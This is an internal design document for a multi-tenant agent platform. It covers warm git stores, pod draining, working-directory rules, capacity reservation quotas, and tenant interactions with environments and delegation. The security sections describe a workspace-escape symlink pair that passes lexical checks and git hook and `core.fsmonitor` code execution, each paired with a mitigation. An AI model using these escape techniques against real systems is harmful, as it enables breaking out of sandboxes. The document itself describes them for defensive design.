**Reused pods.** The owner allowed `warm` on a pool that reuses pods, by concurrency or by recycling, in the words "go with your recommendations". `ClaimSlot`'s first pass and `rebindReserved` place a session on a running or held pod with no claim check, so `coveredStores` does not reach them. A repository removed from the runtime or off the allowlist therefore stays readable to new sessions on such a pod until it retires, under `maxPodUptimeSeconds` or when its last session ends, and the age drain, which acts on idle pods alone, does not reach it either. Such a pool cannot serve a clone under `userAuthorization: required`, so its sessions already read through the tenant's App, and no per-user check is lost. A write of a `gitRepository` asset on such a pool answers with a `Warning` stating this and naming `oneSessionPerPod: true`, and the `Warning` states the missing bound when the template has no `maxPodUptimeSeconds`. A template write that makes a pool holding a `gitRepository` asset reuse pods states the same in `runtime.base_changed`. Refusing the pod instead would make a new session need a new pod and could hit the tenant's budget until the old pods empty. Every runtime process launches at bind, so no runtime process reads a store while its slot has no session.

**Changing the list.** The WarmPoolController drains an idle pod holding a store no longer on the rendered list, which follows a removed `gitRepository` asset, a repository off the allowlist, a grant set to 0, an entry removed from the base, and an entry suspended at render, under "Scoped repositories" or for a tenant deny. An entry leaving the rendered list for any reason also leaves `coveredStores`, so pods holding its store are refused at the next claim, at each caller of `AdmitTenantPin`, and that removal always passes. Every other pod stays claimable, because it holds a subset of what the session was checked for. A new entry or a ref change touches no existing pod: new pods fill from the new list, and older pods leave under the age limit. Running sessions keep their stores until they end, apart from a store withheld for that session. Once [`0140-runtime-revisions`](../0140-runtime-revisions/change.md) lands, the runtime's `sharedAssets` append, its `gitRepository` assets included, enters the pod-set key of [RV-3](../0140-runtime-revisions/change.md#rv-3-pods), under its decision D13. A change to them then creates a new pod set on the owned pool without creating a base revision, and the rules of this paragraph govern how the earlier pod set's pods leave: an idle pod holding a removed store drains, a pod outside `coveredStores` is refused at the claim, and every other pod stays claimable until it leaves under the age limit. A change to the base's public entries creates a base revision instead, and reaches the owned pool through that revision's rollout.

**Age.** A store never refreshes, so the WarmPoolController drains an idle pod whose store is older than the pool's `warmCloneMaxAgeSeconds`, while fewer than `warmClones.maxConcurrentFillsPerTenant` of the pool's pods are running a fill, whether or not replacements succeed. A failed fill, a Pending pod held at the quota, or a pool at its bound therefore does not stop the drain, and a large pool does not take past the limit by draining in series, so this bounds how long an idle pod holds content a host has since removed or a tenant has since lost access to, and it bounds the delta's growth. It also means an outage at the host longer than the limit empties the pool's warm pods. The tenant admin, or a platform admin writing for the tenant, sets `warmCloneMaxAgeSeconds` per owned pool, between `warmClones.minAgeSeconds` and `warmClones.maxAgeSeconds`, 3600 and 86400 by default, and an unset value reads `warmClones.defaultMaxAgeSeconds`. The controller reads the value at each drain decision, so a change applies without a pod roll, and a stored value outside lowered Helm bounds reads as the nearest bound. A longer limit keeps content a host has removed, or a repository whose owner has revoked the tenant's access, readable to new sessions on idle pods for longer, because a clone pinned to a full commit that a store holds contacts no host. That content can belong to another organization, so the tenant can only shorten the default, and an operator who raises `warmClones.maxAgeSeconds` accepts the longer window for every tenant. A shorter one costs refill traffic on `lenny-egress`, which `maxConcurrentFillsPerTenant` bounds. A platform admin can also set `warmCloneMaxAgeSeconds` on a platform pool, with no Helm bound. Unset there, a store has no age limit, which decision 31 keeps as the default on platform pools. On an owned pool the limit applies to every store on the pod, a platform entry's included.

**Budget.** A warm pod counts as `warmCount` and a failed one as `unusable`, under "Bounds", with no new figure, apart from a pod a platform-declared entry failed, which counts in no term of T. A marked pod that has not finished its fill is not `held`, so `TenantReservationUnmet` reports a reservation a failing fill blocks. DR-10's "Reporting" defines `held` and the alert.

**Restore.** A resume onto another pod follows 0111's rules 5 and 6, which the "Draft 0111" row under "Terms" summarizes, and both run in `lenny-materialize` as the slot UID ([WM-10](../0153-workspace-materialization/change.md#wm-10-git)): the capture copy, which the helper's `capture-copy` finishes before a checkpoint's pre-copy pass starts, and restore completion, the helper's `restore-complete`, which overwrites alternates without reading the restored file and fetches `lenny.baseCommit` when the pod's store differs, after the adapter restores the snapshot through the broker. That fetch is shallow first, because a warm repository's history is larger than the slot's `workspaceSizeLimitBytes` by design, and the store holds it outside the slot. Only when 0111's rule 5 listing reports a missing object does the helper fetch history, capped at the slot's remaining bytes. The capture copy leaves out `lenny.baseCommit` and its ancestors, so that case is an agent that amended or reset the pinned commit. Such a repository on a pod with no store, whose history does not fit, fails that resume, on a resume path that also holds a cold fetch to 30 s. Every store-backed repository a session has is a `gitClone` source in its stored plan, whoever wrote the source, so that fetch passes the session's readable set. A derive copies the stored plan, so a derived session's sources stay in its plan, and 0111's lineage rule has no case left here, which the rewrite of 0111 confirms. `lenny.gitStoreUrl` is agent-writable, so restore completion fetches only a URL the gateway passes for that bind, which is the plan's repositories, as [`0127-egress-and-git`](../0127-egress-and-git/change.md) states.

#### Relationship to draft proposal 0111

For the record, the owner directed that this design build on 0111 and replace it where that makes sense. Draft 0111 is on the branch `draft/0111-warm-workspace`, its status is Draft, and its review did not converge. [`0127-egress-and-git`, "Relationship to proposal 0111 and open findings"](../0127-egress-and-git/change.md#relationship-to-proposal-0111-and-open-findings), already rewrites it around pod-side git and drops `FetchGitPack`, the gateway mirror, and pack serving. This section applies on top of that rewrite.

These parts of 0111 stand for every warm-list entry: a pod-wide read-only bare store filled before ready, one immutable commit, a per-slot repository over alternates that fetches a delta, no worktrees against a store, the capture copy, restore completion, the treatment of an agent-written repository as untrusted content, which [WM-9](../0153-workspace-materialization/change.md#wm-9-archive-extraction-leaves-the-gateway)'s rule now states, a failed fill taking the pod to `failed`, no setup pre-running, and `ownerTenantId`.

Earlier revisions held a table here of the places where warm clones departed from 0111: the declaration, the carrier, the full commit, the sized store, the age limit and drain, the backoff, the authorization, and the tree bound. Under decision 31 each of those departures becomes the rule for every entry on a pool's warm list, so the record of differences gives way to what the rewrite of 0111 must do (decision 37). Step [0127.S5](../0127-egress-and-git/steps.md#steps) of the egress design carries the rewrite, and the rewrite must do the following:

- Define one warm list per pool and its rule set, as "Warm stores" states. That covers the entry fields (the URL, the ref as a branch, a tag, or a full commit, the declarer, and `prestage`), one store per normalized URL with a tenant entry's ref winning, the carrier `PodSet.spec.warmClones` for every pool, the volume `lenny-git-stores` sized by `warmCloneBytes` with the matching storage request on every pool that renders an entry, the age limit unset by default on platform pools, the drain when an entry leaves the list, claim refusal through `coveredStores`, withholding through `withheldStores`, backoff keyed by store for every declarer with the declarer recorded on the `AgentPod`, the per-tenant fill limit and a fill limit for shared pools, acceptance of a full commit, and the helper's tree bound before checkout. A Runtime or pool write that leaves a rendered entry unsized is refused.
- Make a Runtime's `gitRepository` entry public only, and drop private entries on a Runtime, the ownership key of owner and URL that rule 2 gives a Runtime, and the Runtime-wide ownership checks. A private repository is warmed for one tenant through a `gitRepository` asset on that tenant's derived runtime, under "Tenant shared assets".
- Drop `destPath`, because every store sits on the warm list's volume and a session reaches a store through alternates. The entry's only staging field is `prestage: true`, which names no path.
- Replace rule 1's eligibility with the rule under "Session": a store serves any `gitClone` source whose normalized URL matches it, unless the source sets `depth` or `submodules: true`.
- Confirm that derive's copy of the stored plan leaves the restore lineage no case, and if so drop rule 7 and `REG-GITLINEAGE`.
- State what restore completion does when an agent writes a `lenny.gitStoreUrl` outside the set of URLs the gateway passed for that bind. This design recommends that the adapter write no alternates for it and fetch nothing, so the restore fails when an object is missing, which harms only the agent's own session.
- State that a repository an agent wires to a store through alternates without `lenny.*` keys gets no store service. The capture copy and restore completion do not touch it, its snapshot keeps an absolute alternates path that breaks on a pod whose store differs, and it cannot reach a withheld store, because the deletion runs before anything runs for the session.
- Apply the environment rule under "Scoped repositories" to every entry, at write and at render.

#### Not verified

[`0127-egress-and-git`](../0127-egress-and-git/change.md) moves the clone into the pod and does not state how materialization treats a target directory that already holds files. Under DR-12 every clone names its own subfolder, but default files and earlier sources materialize first and can write into that subfolder, so a non-empty target still has to work. A snapshot's content does not meet a clone on a derive, because `from: latest` clones nothing.

The answer is an integrity rule at the slot UID. `lenny-materialize` runs the clone as the slot UID with the pinned git, and it holds no service account token and no VCS token ([WM-10](../0153-workspace-materialization/change.md#wm-10-git)). A `.git/config` in the target that sets `core.fsmonitor`, or a hook there, would run tenant-chosen code at the slot UID, which every session file can already reach through the agent, so it no longer reaches the adapter's identity, which DR-3 exists to protect. It could still change the plan's outcome. The `.git` refusal above closes the tenant's way in. The helper clones into a fresh directory under `/workspace/.lenny-build/` with `--template=`, passes `-c core.hooksPath=/dev/null -c core.fsmonitor=false` on every command, runs all its git work there, including setting `origin`, and only then moves the result to the target. An existing `.git` at the target is replaced as a unit, because the path collision rule works per path and a planted `commondir` or hook would otherwise survive a merge. The helper runs no git in the target after the move apart from the index refresh, the capture copy, and restore completion, each under the configuration and environment the helper supplies, so nothing an agent wrote takes effect, and the adapter runs no git on the slot repository at all.

**Symbolic links.** The move and every other write the materializer makes run in `lenny-materialize` at the slot UID, into a tree an earlier session's agent may have written or a restore may have seeded. `extractSymlink` and `ValidateSymlinkTarget` check a link's target lexically, so a restored pair such as `a/b/l -> ../..` and `src -> a/b/l/../../outside/src` passes both and resolves outside the workspace. `overlayTree` and `writeInlineFile` then follow it. Every helper write, move, and removal therefore opens its path with `openat2` under `RESOLVE_BENEATH | RESOLVE_NO_SYMLINKS | RESOLVE_NO_XDEV` beneath `/workspace`, and a path crossing a link fails the materialization, as [`0153-workspace-materialization`](../0153-workspace-materialization/change.md) states for every source. Today's writers in the adapter have this hole (DF-15, F-13.4.24), so the fix does not wait for this design.

**Warm clone spike, 2026-11-05.** Its evidence is under `evidence/tenant-derived-runtimes-design/spike-warm/`. No Go `netagent` exists, so a stand-in for its git path terminated TLS for every host under a per-run CA, re-originated over HTTP/1.1 against public roots, and logged each request's wants and haves. It ran git 2.49.1 against public repositories, anonymously, with the store mounted read-only and each move crossing filesystems.

- GitHub, GitLab.com, Bitbucket Cloud, Codeberg (Forgejo), Gitea.com, sourcehut, kernel.org, and Azure DevOps each served a fetch by SHA of a tip, of a non-tip ancestor with full history, at depth 1, and at depth 12. Azure DevOps answers only protocol v0, and git fell back.
- Over alternates, git's first have was the store's commit on every host, and the fetch of a commit ten commits later moved 13.7 to 482.2 KiB against 87.7 to 12,680.9 KiB with no store. A store whose ref was deleted drew no haves and a full resend on every host, which shows that the store needs its commit as a ref, as "Fill" writes it.
- A commit the store holds was found and checked out with no fetch. After the move, the absolute alternates path held, `git status` was clean, `fsck --connectivity-only` passed, and a commit succeeded.

Still unverified: a real `netagent`, HTTP/2 between git and `netagent`, a minted credential or private repository, a VCS pool with `userAuthorization: required`, git on GnuTLS, large repositories and checkout time, restore through the capture copy and restore completion, every git step run by `lenny-materialize` as the slot UID with the pinned, exec-only git against a store at `/lenny/git-stores` that `lenny-store-fill` filled, the fetch grant, and the warm-up checkout with the reflink rebuild on runc with XFS and its fallback on gVisor and Kata.

### DR-12: Repository folders and the working directory

The owner settled decision 19 with a rule for every session, which covers a client's clones as well as default clones: every repository goes in its own subfolder of `/workspace`, the session's working tree ([PL-3](../0118-agent-pod-layout/change.md#pl-3-runtime-visible-filesystem-layout)). A session can then start in a folder the plan names, because a coding agent expects to start inside its repository.

**Repository folders.** Every `gitClone` source, from a client, a runtime's defaults, or a tenant's defaults, names `path`, a relative subdirectory of `/workspace` that is not `.`. §14's default of `.` goes, and a plan whose clone omits `path` or names `.` answers `400 WORKSPACE_PLAN_INVALID`. Two clones in one plan cannot share a path or sit one inside the other, and composition refuses a client clone that meets a default clone, with `details.source: runtimeDefault` and no URL, as "Binding" states for other refusals a default causes. A file whose path lies inside a clone's folder keeps §14's per-path collision rule, so a plan can still write a file into its repository. `lenny-materialize` still clones into a fresh directory and moves the result, as DR-9's "Not verified" states, because an earlier source can have written into the target.

**`workingDirectory`.** The plan gains an optional `workingDirectory`, a relative path under `/workspace`. An empty string and `.` both name `/workspace` itself. A runtime's `workspaceDefaults` can set one too, which passes the same checks at the runtime write and follows §5.1's rule for a derived field, replacing the base's value. A plan that sets the field, including to an empty string or `.`, wins over the runtime's value, and a plan that omits it takes the runtime's value, or `/workspace` when the runtime sets none, so a client that does not know a default repository's folder still starts in it. Any other value passes the same path checks as a source `path`, including the `.git` refusal. The stored plan holds the composed value, always as a concrete path, so a derive, retry, or rebuild onto another runtime starts in the same folder.

- **Start.** After materialization, and before setup commands, the adapter opens the folder through the slot's broker, which resolves it beneath the workspace root with `openat2` under `RESOLVE_BENEATH | RESOLVE_NO_XDEV | RESOLVE_NO_SYMLINKS` ([SI-5](../0145-session-isolation/change.md#si-5-the-supervisor-file-descriptor-broker)), and it checks again after setup and before the runtime starts, because a command can remove or replace it. A missing folder, a file, or a path crossing a symbolic link fails the session with `SESSION_CREATION_FAILED` and the reason `working_directory_invalid`, as the [egress design](../0127-egress-and-git/change.md)'s finalize failures do. The folder reaches the runtime as a new `cwd` field on the session's `session_start` frame (§28.5.3) and on `StartSessionRequest`, which carry none today, and §6.4 changes from a runtime deriving `cwd` from the session identifier to a runtime using that field, which always lies under `/workspace`. The slot container's working directory is `/workspace` itself, so the supervisor starts every runtime process there, and the runtime moves into `cwd` ([PL-3](../0118-agent-pod-layout/change.md#pl-3-runtime-visible-filesystem-layout)). No runtime is deployed, so the reference runtimes and the runtime author guide adopt it with no fallback. The session row's `cwd` and the resume driver's `expected_workspace_root` hold the constant `/workspace`, which no longer depends on the session identifier, so `resumeOnPod`'s root check compares constants.
- **Setup commands.** Each `setupCommands` entry gains an optional `cwd`, a relative path under `/workspace` with the same checks, and the adapter applies the start check to it before the command runs. When a session's plan is composed, the gateway resolves the folder of each command that sets no `cwd` and writes it on the stored command as an explicit `cwd`. A client's command takes the plan's working directory. An operator's or tenant's default command takes the working directory named by the `workspaceDefaults` that hold the command, or `/workspace` when they name none, so a client's choice does not move a command its author wrote for another folder. A command a derive adds through `additionalSetupCommands`, whose `origin` is `derive`, takes the plan's working directory when it sets no `cwd`, as a client's command does. After composition a command's `origin` decides only which policy checks it, through the `setupCommandPolicy` exemption, and never its folder. A derive copies each stored command with its `cwd`, so the relabel of an `operator` command to `client` under [`0144-session-derive`, "Checks"](../0144-session-derive/change.md#checks) leaves the command in its folder. A command under `setupCommandPolicy.shell: false` cannot change folder itself, which is why the field exists.
- **Resume and derive.** The stored plan carries the value and each command's `cwd`, so a derive, retry, rebuild, and resume start in the same folder and run each setup command in the same folder. An agent can delete or replace the folder during a session, so on a resume, a restore, or a `from: latest` derive a folder that fails the check starts the runtime in `/workspace` and records `workspace.working_directory_fallback`, rather than failing a session the user did not misconfigure. A native SDK resume that keys on its directory can then start a fresh conversation, and the event says so.

**Compatibility.** §14 treats a newly required field as a breaking change that needs a `schemaVersion` bump. No deployment exists, so DR-12 changes `schemaVersion` 1 in place, and §14's rule applies from the first release.

DR-12 changes a wire contract and the stored plan, so it lands before DR-9, and it stands on its own for sessions on every runtime.

### DR-10: Capacity reservation

#### What a reservation holds

`maxOwnedPods` is a ceiling. A tenant holding 20 cannot go above it, and nothing ensures that 20 can start. A reservation is a floor, and three things can take capacity away from one:

| What takes capacity | Control in this design | Holds against it |
| :-- | :-- | :-- |
| A pod ending, which frees its place until a replacement starts | The controller keeps the pool at its floor, counting warm and active pods | The pods that exist. A replacement can wait on the two rows below. |
| Other pools' pods reaching the namespace `ResourceQuota` | The quota is split, and the reserved share is unavailable to other pods | Pod count, CPU, and memory, at quota admission. Ephemeral storage stays shared, as "The quota" states. |
| Other pools' pods filling the nodes | The template's reserved overlay ([PM-3](../0136-placement/change.md#reserved-overlay)), when it names nodes the operator reserves | Fully when the overlay's nodes host nothing else. Without an overlay, only the pods that exist hold node capacity, and a replacement competes for what is free. |

#### Who can turn it on

Every level is off until the level above it allows it.

| Setting | Set by | Effect |
| :-- | :-- | :-- |
| `runtimes.tenantDerivation.reservations.enabled` | Operator (Helm), false by default | While false, the chart renders neither the `lenny-reserved` `PriorityClass` nor the split quota, which "The quota" below states, and a grant cannot allow a reservation. The controller reads the same value, so stored floors stop applying, no pod is marked, `createPod` renders no class on a marked `AgentPod` with no pod, T stops charging `reservedPods`, and `GET` reports the reservation as `inactive`. Pods already running continue. |
| `runtimes.tenantDerivation.reservations.totalPods`, per resource class | Operator (Helm) | The deployment's reservable total, which sizes the reserved quota. |
| `bases[].maxReservedPods`, per resource class | Platform admin, in the grant | The tenant's allowance, none by default. Across all grants, the allowances for a class stay at or below the total, checked under the lock that grant writes take. Across one grant, all allowances together stay at or below `maxOwnedPods`. |
| `pool.reservedPods` | Tenant admin, or a platform admin writing for the tenant | The floor on one derived runtime's pool, at or below the allowance across the tenant's pools of that base and class. |

The allowance belongs to the tenant, and the tenant divides it among its runtimes, because each pod belongs to one pool and one resource class. A tenant using only shared pools has nothing to reserve, because warm pods on a shared pool have no tenant. A derived runtime with no changes to the base gives such a tenant an owned pool.

Reservations apply in the agent namespace the PoolScalingController manages (`--agent-namespace`), because the tree has no pool-to-namespace mapping. Under [PM-9](../0136-placement/change.md#pm-9-namespaces), `lenny-agents` holds every agent pod of every profile and `lenny-agents-kata` is dropped, so a template with a `microvm` profile carries an allowance as any other template does, and its reserved overlay keeps its reserved pods within the node class of the `microvm` member ([PM-3](../0136-placement/change.md#reserved-overlay)).

#### Mechanism

**The floor.** The WarmPoolController computes the warm target of an owned pool on each reconcile, from `PodSet.spec.reservedPods` and its own `AgentPod` list, as `max(spec.minWarm, reservedPods - active)`, where `spec.minWarm` is the `warmCount` the PoolScalingController rendered, or 0 under a stop, and passes it to `plan.Compute` as both `MinWarm` and `MaxWarm`. `warmTarget` clamps to `MaxWarm`, so raising `MinWarm` alone would have no effect, and setting both keeps the pinned idle bound at zero, as DR-5 needs. `reconcilePDB` and the pool conditions read the same target, because they read `spec.minWarm` today and a reserved pod would get no disruption budget. `active` counts `claimed` and `reserved` pods, and leaves out `draining` and `failed`, which are unusable. It cannot be computed in the PoolScalingController, which syncs every 30 seconds while the WarmPoolController reacts to `AgentPod` events at once, because a stale target creates pods the floor does not need. A pool with `reservedPods: 5` and `warmCount: 1` runs 5 warm pods when idle, 2 warm pods with 3 sessions, and 1 warm pod with 5 or more sessions.

The floor applies after the scaling formula, so low demand or a `scaleToZero` window cannot take the pool below it. `resolveWarm` writes `MinWarm: 0` for both a force-zero and a `scaleToZero` window, so the controller cannot tell them apart from that value. The PoolScalingController therefore renders `spec.reservedPods` as 0 on `ForceZeroMinWarm` and when the pool row has `DrainingSince` set, because the `drain` route sets only that column, and as the stored value otherwise. `drainAndDeleteWarmPool` bypasses `syncWarmPool`, so it writes the field itself. A non-empty `warm_stop_reasons` maps to `ForceZeroMinWarm`, so a suspended tenant, a retired base, and a security forbid still drain the pool.

**The quota.** With reservations on, the chart renders the cluster-scoped `PriorityClass` `lenny-reserved`, named by the Helm value `placement.priorityClasses.reserved` in the priority-class scheme of [PM-8](../0136-placement/change.md#priority-classes), with value 0 and `preemptionPolicy: Never`, and splits `lenny-agent-quota` in the agent namespace through the `PriorityClass` quota scope, which selects that class. A new `lenny-agent-reserved-quota` matches that class and limits `pods` to the sum of `totalPods`. Limiting CPU and memory there would need the total requests of a rendered pod, and `applyResources` stamps a class's requests on every container, so a pod's total depends on its sidecars and RuntimeClass overhead. A limit computed from the class alone would run out at half the stated pods or sooner. The grants and the class sizes bound what those pods request, so a `pods` limit is enough for the reserved share. The reserved quota sits beside the per-class quotas of [PM-8](../0136-placement/change.md#priority-classes): a reserved pod carries `lenny-reserved` in place of its class's agent priority class, so a class quota that selects `lenny-agent-<class>` does not count it, and the reserved quota bounds it instead. `lenny-agent-quota` matches every other pod, and it holds the namespace's pod count less `totalPods`, and its CPU and memory less `reservations.reservedRequests`, in which the operator states what to set aside. Kubernetes refuses `requests.ephemeral-storage` under a `PriorityClass` scope (`IsResourceQuotaScopeValidForResource` accepts `pods` and the CPU and memory resources alone), so a third quota, `lenny-agent-storage-quota`, carries it with no scope, at the namespace's value. Other pools can therefore use up storage and refuse a reserved pod, and `TenantReservationUnmet` reports it. An operator sizes that value with the reserved pods included. Nothing in the tree can compute a rendered pod's total, so this figure is the operator's statement, and documentation gives the arithmetic. If it is wrong, the namespace total is misstated, and no reserved pod is refused.

**Which pods are reserved.** `priorityClassName` is immutable, so the WarmPoolController decides when it creates an `AgentPod`: while the pool has fewer than `reservedPods` non-terminal `AgentPod` objects marked `spec.reserved`, the new one is marked and its pod takes the class. Later pods use the general quota. Two more rules keep the floor:

- The controller drains unmarked idle pods before marked ones.
- `createPod` retries a rejected pod indefinitely, and `plan.Compute` counts that `AgentPod` as warm. While marked `AgentPod` objects are below `reservedPods`, the controller deletes an unmarked `AgentPod` in `warming` that has no pod, and creates a marked one. Deleting one that has just created its pod loses only a warming pod, because `claimer.go` claims only `idle` pods. Terminating `AgentPod` objects do not count as marked. Otherwise a full general quota would leave a stuck `AgentPod` standing in for a pod the reserved quota could start. The planner gains this action, and the rule converges because marks only rise until they reach `reservedPods`.

The controller reads `AgentPod` objects through its cached client, so a stale count can over-mark a pod. The reserved quota then refuses it, and the next reconcile corrects the count.

**Nodes.** A template pool can set `placement.reservedOverlay`, a `nodePlacement` of a `nodeSelector` and `tolerations` that the pool applies to its reserved pods alone, which replaces `reservedPlacement` ([PM-3](../0136-placement/change.md#reserved-overlay)). The operator labels and taints the nodes it names, so that no other pod lands there. The field is platform-written on the template and copied to owned pools, and the tenant cannot set it. It is validated as an offering's `nodePlacement` is, so it cannot leave the pool's node class, tolerate a class taint or a `lenny.dev/tenant` taint, or name another tenant's nodes, which replaces the refusals that earlier revisions stated for the T4 selector and the Kata toleration. A tenant whose security settings require dedicated nodes is served by a single-tenant pool with dedicated tenancy ([PM-2](../0136-placement/change.md#pm-2-node-tenancy)), whose reserved pods run on that tenant's nodes: the overlay adds to the pool's tenant node affinity and toleration and never replaces them. Without an overlay, `GET` and posture report `placementConfigured: false`; posture's `placementConfigured` reads the overlay. Preflight checks that a node carries the overlay's selector, and the size of that node pool remains the operator's responsibility.

**No preemption and no priority.** A reserved pod never evicts another pod, and its class has value 0, so it has the priority of every other pod. Ordinary agent pods carry the agent priority class of their node class, `lenny-agent-<class>` of [PM-8](../0136-placement/change.md#priority-classes), also value 0 with `preemptionPolicy: Never`. A preempting reserved pod's victims would include other tenants' running sessions, and §28.5.6 states that a preemption bypasses the eviction API and opens no `CH-ADMISSION` channel, the gateway's drain-readiness admission webhook on pod eviction, so the checks on that channel do not run. A raised value would also cause kubelet node-pressure eviction to prefer other tenants' pods and platform pods over one tenant's idle reserved pods. When nodes are full, a reserved pod waits for free capacity or the cluster autoscaler.

#### Budget

`reservedPods` enters the one figure under "Bounds". A pool is charged `reservedPods + warmCount` from the moment the reservation is written, because the warm target keeps `warmCount` warm once sessions have used the reservation. A claim within the reservation leaves T unchanged, so it always passes, and a claim beyond it raises T like any other. With `warmCount` at least 1, a reservation stays below `maxOwnedPods`. The floor is subject to the creation rule under "Bounds", so the bound wins when the two conflict, because R5 protects other tenants. During a base rollout, the extra pod set that "A base rollout" under "Bounds" names is never marked `spec.reserved`, counts against neither the tenant's allowance nor `reservations.totalPods`, and runs under the general quota, under decision D8 of [`0140-runtime-revisions`](../0140-runtime-revisions/decisions.md#decisions). The floor applies to the pod set of the revision with the highest weight.

#### Changes after a write

- A grant write lowering an allowance or `maxOwnedPods` lowers allowances and `reservedPods` in the same transaction, in name order, until the allowances and T fit, and `runtime.base_changed` goes out. Excess marked pods that are idle drain, and active ones end with their sessions.
- Those active pods still hold reserved quota. A grant write raising any allowance therefore counts live marked pods above each tenant's allowance, and it is refused while allowances plus that overrun would pass `totalPods`.
- A `totalPods` lowered below what grants allow does not reach the database. Marked pod creation then fails at quota admission, and `PoolScaleoutBlockedByQuota` fires. Preflight compares the two where it can read them.
- `DELETE` releases the runtime's reservation with its pool.

#### Reporting

`GET /v1/admin/derived-runtimes/{name}` reports `reservation`, with `requested`, `held`, `state`, `placementConfigured`, and `blockedBy`. A new metric reports requested and held pods per pool, under the cardinality statement in §16, and a `TenantReservationUnmet` alert fires when `held` stays below `requested` past a Helm-set period, whatever the cause, so a refusal at RuntimeClass admission or a missing class is reported as well as a quota refusal. Posture's `gates` section reports the allowance and its use. [`0121-billing-resource-attribution`](../0121-billing-resource-attribution/change.md#poolidle_usage) attributes a tenant's reserved idle cost through `pool.idle_usage`, which reports an owned pool's idle pod minutes under its owning tenant and counts the minutes of reserved pods in `reserved_pod_minutes`. The idle minutes of a base rollout's extra pod set, which "A base rollout" under "Bounds" names, go to the platform rather than the owning tenant, under decision D8 of [`0140-runtime-revisions`](../0140-runtime-revisions/decisions.md#decisions), so the tenant is not billed for them. `lenny_warmpool_idle_pod_minutes` reports idle pods per pool and carries no tenant label.

#### What it costs and what it leaves open

- The reserved share of the quota is unavailable to every other pool, including while a tenant has not used its allowance. This is the operator's cost at the Helm value.
- Nodes reserved through the overlay cost idle nodes for the whole reserved total.
- A tenant pays for reserved pods while they sit idle, whether billing reads that or the operator charges another way.
- A node failure reduces `held` until replacements start, and a replacement takes the pod start time. A reservation with no overlay can wait longer.
- The floor counts pods, and a one-session pool's `reservedPods` equals sessions. A concurrent pool's floor serves more sessions per pod.

### DR-8: Interactions

#### Environments

A tenant view runs first, so an environment's `runtimeSelector` only ever sees what the tenant can reach. This also closes the case where `Selector.Matches` with an empty selector admits every registered runtime in the deployment.

`Merge` overlays labels, so a new derived runtime inherits the base's labels and joins every environment whose selector matches them, with its default commands. A write answers with a `Warning` listing the environments that admit it and any `dangerouslyShare` selector that matches it, an environment entry that opens a sharing path for delegated children into another environment, as [`0149-tenant-scoping-identity`](../0149-tenant-scoping-identity/change.md) does for its writes. A tenant admin separates a runtime by overriding a label's value or with `exclude`, because the merge cannot remove a base key.

`ENVIRONMENT_REQUIRED` and `ENVIRONMENT_POLICY_NOT_ENFORCEABLE` read the final runtime and pool on the tenant view, under [that design](../0149-tenant-scoping-identity/change.md)'s rule for the final row. An owned pool at one session per pod with no recycling evaluates with E's full policy, and so does one with recycling, under the residual [that design's decision 5](../0149-tenant-scoping-identity/decisions.md#decisions) accepts: what the pool recycle scrub does not reach passes from one environment's session to the next in the tenant. An owned pool that keeps a concurrent template's value evaluates each session with its own E where `netagent` attributes each connection to its slot, under decision 60 of [`0127-egress-and-git`](../0127-egress-and-git/decisions.md#decisions), and stays a pod with no per-session policy where it cannot, where the rule refuses as it does for any such pod. The `Warning` for an environment's first entry gains the name of the template-eligible bases, so a tenant admin learns the way.

#### Runtime routes

A runtime route ([RT-4](../0141-runtime-routing/change.md#rt-4-runtime-routes)) is tenant-scoped. Its admission reads the tenant view and pool access for every active revision of the runtimes it names, so a route can name the tenant's own derived runtime as its requested runtime or as a target, and the runtime's owned pool as a target's pool, while another tenant's runtime or owned pool answers as unknown. A route writes no pool configuration, so it neither sizes nor drains an owned pool. A target pool that the client did not pin is resolved as for any create.

A route or an external `PreRoute` interceptor can move a session after admission. The post-chain point of [RT-2](../0141-runtime-routing/change.md#post-chain-point) re-runs, on the final row and the chosen base revision, the tenant-view check under "Reading", the pool check under "Pods", the environment checks that [`0149-tenant-scoping-identity`](../0149-tenant-scoping-identity/change.md) places there, and the `registered` check under "Registered rows" in DR-4, and the tenant pin refuses another tenant's pod at claim. An access row revoked after the route's write therefore stops the sessions and delegated children it would move. A route write naming a runtime whose default clones carry `write` values answers with a `Warning`, as "Write scope" under DR-9 states.

#### Delegation

A delegated child's exports are not refused for the target's runtime. Every slot container of every agent pod runs the runtime supervisor ([PL-1](../0118-agent-pod-layout/change.md#pl-1-pod-blueprint)), the embedded deployment model is removed ([PL-2](../0118-agent-pod-layout/change.md#pl-2-removal-of-the-embedded-deployment-model)), and `type: mcp` runtimes are removed ([`0119-agent-runtimes-only`](../0119-agent-runtimes-only/change.md)), so no target lacks a supervisor, and the export refusal this section held leaves under AR O8, which the owner settled on 2026-11-13. A target whose runtime row is not `registered` is refused at the post-chain point under "Registered rows" in DR-4, on the final row, because the child's `PreRoute` chain can move it to another runtime after `materializeExport` has run, and the deferred `undoChildExport` cleans up. On every target, `lenny-materialize` writes the exported files at the child's slot UID, and an operator's setup command that reads one runs at that UID through the supervisor under DR-3, away from the adapter's service account token, so a prompt-injected parent's `requirements.txt` reaches only the child's own session. Before DR-3 and the materialization design, a command on the child ran at the adapter's UID with the service account token (F-8.7.16), and those two close it. A client's own plan file on such a pod is a separate path, which needs the client's authority and which F-7.5.17 records.

`resolveDelegationTarget` and `runtimeAuthorizedForCaller` read through the tenant view with the parent's tenant, so another tenant's name answers `TARGET_NOT_IN_SCOPE`. `runtimeAuthorizedForCaller` returns true on a read error today (F-10.6.23), and a tenant-view miss would reach that branch, so DR-8 depends on [TS-3](../0149-tenant-scoping-identity/change.md#ts-3-session-environment-context-and-cross-environment-sharing)'s fail-closed gate. `DelegationPolicy` allow lists are tenant-scoped, and a label or `ids` entry matches a derived runtime as it does any other. Isolation monotonicity applies on the owned pool's copied profile.

#### Cross-environment sharing

A tenant-derived runtime can be the target of a sharing path, a pair of `dangerouslyShare` entries through which a delegated child runs in another environment, under [`0149-tenant-scoping-identity` decision 14](../0149-tenant-scoping-identity/decisions.md#decisions). The child runs under the target environment's policy on the owned pool, and its default commands are the tenant admin's. A label edit can add it to a declared path at once, which is the residual that design already states, and the `Warning` above reports it. Sharing never crosses a tenant, because environments are per tenant.

#### Per-tenant capability overrides

`runtime-capability-overrides` applies on top of the effective runtime, once `ResolveForTenant` and the `PUT` handler read the tenant view. A tenant can override capabilities for its own sessions on any runtime, so the prohibition on a derived runtime's `capabilities` does not stop that surface. Under decision D17 of [`0140-runtime-revisions`](../0140-runtime-revisions/change.md#per-tenant-capability-override), the override narrows and no longer replaces:

